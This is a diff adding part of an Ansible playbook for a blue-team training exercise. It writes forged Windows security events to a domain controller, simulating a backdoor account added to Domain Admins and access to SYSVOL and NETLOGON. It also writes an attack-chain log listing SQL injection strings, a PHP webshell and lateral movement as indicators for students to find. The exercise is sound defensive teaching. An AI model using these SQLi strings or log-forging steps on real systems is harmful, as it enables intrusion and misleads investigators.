+    - name: "FASE 4.2 - Simular privilegio elevado en DC"
+      delegate_to: domaincontroller
+      become: yes
+      ansible.windows.win_eventlog:
+        channel: Security
+        event_id: 4672
+        provider: Microsoft-Windows-Security-Auditing
+        XML: |
+          <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
+            <System>
+              <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
+              <EventID>4672</EventID>
+              <Version>1</Version>
+              <Level>0</Level>
+              <Task>12548</Task>
+              <Opcode>0</Opcode>
+              <Keywords>0x8020000000000000</Keywords>
+              <TimeCreated SystemTime='{{ lookup('pipe', 'date -d \"39 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}'/>
+              <EventRecordID>200002</EventRecordID>
+              <Channel>Security</Channel>
+              <Computer>DC01.banco-dsol.local</Computer>
+            </System>
+            <EventData>
+              <Data Name='SubjectUserSid'>S-1-5-21-1234567890-1234567890-1234567890-500</Data>
+              <Data Name='SubjectUserName'>Administrator</Data>
+              <Data Name='SubjectDomainName'>banco-dsol</Data>
+              <Data Name='SubjectLogonId'>0x2345678</Data>
+              <Data Name='PrivilegeList'>SeAssignPrimaryTokenPrivilege SeTcbPrivilege SeSecurityPrivilege SeTakeOwnershipPrivilege SeLoadDriverPrivilege SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege SeSystemEnvironmentPrivilege SeImpersonatePrivilege SeRelabelPrivilege</Data>
+            </EventData>
+          </Event>
+      ignore_errors: yes
+
+    - name: "FASE 4.3 - Simular creacion de cuenta backdoor"
+      delegate_to: domaincontroller
+      become: yes
+      ansible.windows.win_eventlog:
+        channel: Security
+        event_id: 4720
+        provider: Microsoft-Windows-Security-Auditing
+        XML: |
+          <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
+            <System>
+              <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
+              <EventID>4720</EventID>
+              <Version>1</Version>
+              <Level>0</Level>
+              <Task>13824</Task>
+              <Opcode>0</Opcode>
+              <Keywords>0x8020000000000000</Keywords>
+              <TimeCreated SystemTime='{{ lookup('pipe', 'date -d \"38 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}'/>
+              <EventRecordID>200003</EventRecordID>
+              <Channel>Security</Channel>
+              <Computer>DC01.banco-dsol.local</Computer>
+            </System>
+            <EventData>
+              <Data Name='SubjectUserSid'>S-1-5-21-1234567890-1234567890-1234567890-500</Data>
+              <Data Name='SubjectUserName'>Administrator</Data>
+              <Data Name='SubjectDomainName'>banco-dsol</Data>
+              <Data Name='SubjectLogonId'>0x2345678</Data>
+              <Data Name='TargetUserName'>backup_admin</Data>
+              <Data Name='TargetDomainName'>banco-dsol</Data>
+              <Data Name='TargetSid'>S-1-5-21-1234567890-1234567890-1234567890-1106</Data>
+              <Data Name='TargetUserSid'>S-1-0-0</Data>
+              <Data Name='TargetUserName_RDN'>CN=backup_admin,CN=Users,DC=banco-dsol,DC=local</Data>
+            </EventData>
+          </Event>
+      ignore_errors: yes
+
+    - name: "FASE 4.4 - Simular adicion a Domain Admins"
+      delegate_to: domaincontroller
+      become: yes
+      ansible.windows.win_eventlog:
+        channel: Security
+        event_id: 4728
+        provider: Microsoft-Windows-Security-Auditing
+        XML: |
+          <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
+            <System>
+              <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
+              <EventID>4728</EventID>
+              <Version>1</Version>
+              <Level>0</Level>
+              <Task>13826</Task>
+              <Opcode>0</Opcode>
+              <Keywords>0x8020000000000000</Keywords>
+              <TimeCreated SystemTime='{{ lookup('pipe', 'date -d \"37 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}'/>
+              <EventRecordID>200004</EventRecordID>
+              <Channel>Security</Channel>
+              <Computer>DC01.banco-dsol.local</Computer>
+            </System>
+            <EventData>
+              <Data Name='SubjectUserSid'>S-1-5-21-1234567890-1234567890-1234567890-500</Data>
+              <Data Name='SubjectUserName'>Administrator</Data>
+              <Data Name='SubjectDomainName'>banco-dsol</Data>
+              <Data Name='SubjectLogonId'>0x2345678</Data>
+              <Data Name='MemberName'>CN=backup_admin,CN=Users,DC=banco-dsol,DC=local</Data>
+              <Data Name='MemberSid'>S-1-5-21-1234567890-1234567890-1234567890-1106</Data>
+              <Data Name='TargetUserName'>Domain Admins</Data>
+              <Data Name='TargetDomainName'>banco-dsol</Data>
+              <Data Name='TargetSid'>S-1-5-21-1234567890-1234567890-1234567890-512</Data>
+            </EventData>
+          </Event>
+      ignore_errors: yes
+
+    - name: "FASE 4.5 - Simular acceso a SYSVOL"
+      delegate_to: domaincontroller
+      become: yes
+      ansible.windows.win_eventlog:
+        channel: Security
+        event_id: 5140
+        provider: Microsoft-Windows-Security-Auditing
+        XML: |
+          <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
+            <System>
+              <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
+              <EventID>5140</EventID>
+              <Version>1</Version>
+              <Level>0</Level>
+              <Task>12800</Task>
+              <Opcode>0</Opcode>
+              <Keywords>0x8020000000000000</Keywords>
+              <TimeCreated SystemTime='{{ lookup('pipe', 'date -d \"36 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}'/>
+              <EventRecordID>200005</EventRecordID>
+              <Channel>Security</Channel>
+              <Computer>DC01.banco-dsol.local</Computer>
+            </System>
+            <EventData>
+              <Data Name='SubjectUserSid'>S-1-5-21-1234567890-1234567890-1234567890-500</Data>
+              <Data Name='SubjectUserName'>Administrator</Data>
+              <Data Name='SubjectDomainName'>banco-dsol</Data>
+              <Data Name='SubjectLogonId'>0x2345678</Data>
+              <Data Name='ObjectType'>File</Data>
+              <Data Name='IpAddress'>{{ fileserver_ip }}</Data>
+              <Data Name='IpPort'>44326</Data>
+              <Data Name='ShareName'>\\\\*\\SYSVOL</Data>
+              <Data Name='ShareLocalPath'>C:\\Windows\\SYSVOL</Data>
+              <Data Name='RelativeTargetName'>banco-dsol.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/Microsoft/Windows NT/SecEdit/GptTmpl.inf</Data>
+              <Data Name='AccessMask'>0x120089</Data>
+            </EventData>
+          </Event>
+      ignore_errors: yes
+
+    - name: "FASE 4.6 - Simular acceso a NETLOGON"
+      delegate_to: domaincontroller
+      become: yes
+      ansible.windows.win_eventlog:
+        channel: Security
+        event_id: 5140
+        provider: Microsoft-Windows-Security-Auditing
+        XML: |
+          <Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
+            <System>
+              <Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/>
+              <EventID>5140</EventID>
+              <Version>1</Version>
+              <Level>0</Level>
+              <Task>12800</Task>
+              <Opcode>0</Opcode>
+              <Keywords>0x8020000000000000</Keywords>
+              <TimeCreated SystemTime='{{ lookup('pipe', 'date -d \"35 minutes ago\" +%Y-%m-%dT%H:%M:%S') }}'/>
+              <EventRecordID>200006</EventRecordID>
+              <Channel>Security</Channel>
+              <Computer>DC01.banco-dsol.local</Computer>
+            </System>
+            <EventData>
+              <Data Name='SubjectUserSid'>S-1-5-21-1234567890-1234567890-1234567890-500</Data>
+              <Data Name='SubjectUserName'>Administrator</Data>
+              <Data Name='SubjectDomainName'>banco-dsol</Data>
+              <Data Name='SubjectLogonId'>0x2345678</Data>
+              <Data Name='ObjectType'>File</Data>
+              <Data Name='IpAddress'>{{ fileserver_ip }}</Data>
+              <Data Name='IpPort'>44326</Data>
+              <Data Name='ShareName'>\\\\*\\NETLOGON</Data>
+              <Data Name='ShareLocalPath'>C:\\Windows\\SYSVOL\\sysvol\\banco-dsol.local\\scripts</Data>
+              <Data Name='RelativeTargetName'>logon_script.bat</Data>
+              <Data Name='AccessMask'>0x120089</Data>
+            </EventData>
+          </Event>
+      ignore_errors: yes
+
+    - name: "FASE 4.7 - Crear log consolidado del ataque"
+      ansible.builtin.copy:
+        dest: "/tmp/attack_chain.log"
+        content: |
+          CADENA DE ATAQUE COMPLETA - BANCO DEL SOL
+          ==========================================
+          Generado: {{ lookup('pipe', 'date') }}
+
+          FASE 1: EXPLORACION Y EXPLOTACION WEB
+          - Inicio: {{ lookup('pipe', 'date -d \"1 hour ago\"') }}
+          - Atacante: {{ attacker_ip }}
+          - Victima: {{ webserver_ip }}
+          - Tecnica: Inyeccion SQL (UNION-based, Error-based)
+          - Datos extraidos: Credenciales de BD, datos de clientes
+
+          FASE 2: PUNTO DE APOYO INICIAL
+          - Inicio: {{ lookup('pipe', 'date -d \"59 minutes ago\"') }}
+          - Atacante: {{ attacker_ip }}
+          - Victima: {{ webserver_ip }}
+          - Tecnica: Webshell (PHP)
+          - Acciones: Colocacion de shell.php, reverse shell
+
+          FASE 3: MOVIMIENTO LATERAL
+          - Inicio: {{ lookup('pipe', 'date -d \"52 minutes ago\"') }}
+          - Origen: {{ webserver_ip }}
+          - Destinos: {{ database_ip }}, {{ fileserver_ip }}, {{ mailserver_ip }}
+          - Tecnica: SSH con credenciales robadas, SMB con credenciales robadas
+          - Datos extraidos: Credenciales de administrator del fileserver
+
+          FASE 4: ESCALAMIENTO DE PRIVILEGIOS
+          - Inicio: {{ lookup('pipe', 'date -d \"40 minutes ago\"') }}
+          - Origen: {{ fileserver_ip }}
+          - Destino: {{ domaincontroller_ip }}
+          - Tecnica: Uso de credenciales validas (Administrator)
+          - Acciones: Creacion de cuenta backdoor, acceso a SYSVOL/NETLOGON
+
+          INDICADORES DE COMPROMISO (IOCs):
+          - IP: {{ attacker_ip }}
+          - Archivo: /var/www/html/banco_del_sol/uploads/shell.php
+          - Cuenta backdoor: backup_admin
+          - Credenciales comprometidas:
+            * bds_webapp (database)
+            * svc_fileserver (fileserver)
+            * Administrator (domaincontroller - temporal)
+          - Patrones en URLs:
+            * ' OR '1'='1
+            * UNION SELECT
+            * INFORMATION_SCHEMA
+          ==========================================
+
+# ==============================================================================
+# Verificacion de la simulacion
+# ==============================================================================
+- name: Verificar simulacion de ataque
+  hosts: localhost
+  become: no
+  gather_facts: no
+  connection: local
+
+  tasks:
+    - name: Mostrar resumen de la simulacion
+      ansible.builtin.debug:
+        msg: |
+          ============================================
+          SIMULACION DE ATAQUE COMPLETADA
+          ============================================
+          Archivos de evidencia creados en:
+          - webserver: /var/log/apache2/access.log (patrones SQLi)
+          - webserver: /var/log/apache2/error.log (errores SQLi)
+          - webserver: /var/www/html/banco_del_sol/uploads/shell.php
+          - webserver: /var/www/html/banco_del_sol/logs/access.log
+          - webserver: /var/www/html/banco_del_sol/logs/websell_activity.log
+          - database: /var/log/mysql/general.log (queries sospechosas)
+          - database: /var/log/auth.log (SSH lateral)
+          - fileserver: Windows Event Log (4624, 5140, 5145)
+          - domaincontroller: Windows Event Log (4624, 4672, 4720, 4728, 5140)
+          - mailserver: /var/log/auth.log (SSH lateral)
+
+          Los estudiantes deben detectar:
+          1. Patrones de SQLi en logs de Apache
+          2. Webshell en uploads/
+          3. Movimiento lateral SSH webserver -> database
+          4. Conexiones SMB sospechosas al fileserver
+          5. Logon de Administrator desde fileserver al DC
+          6. Creacion de cuenta backdoor en AD
+          ============================================
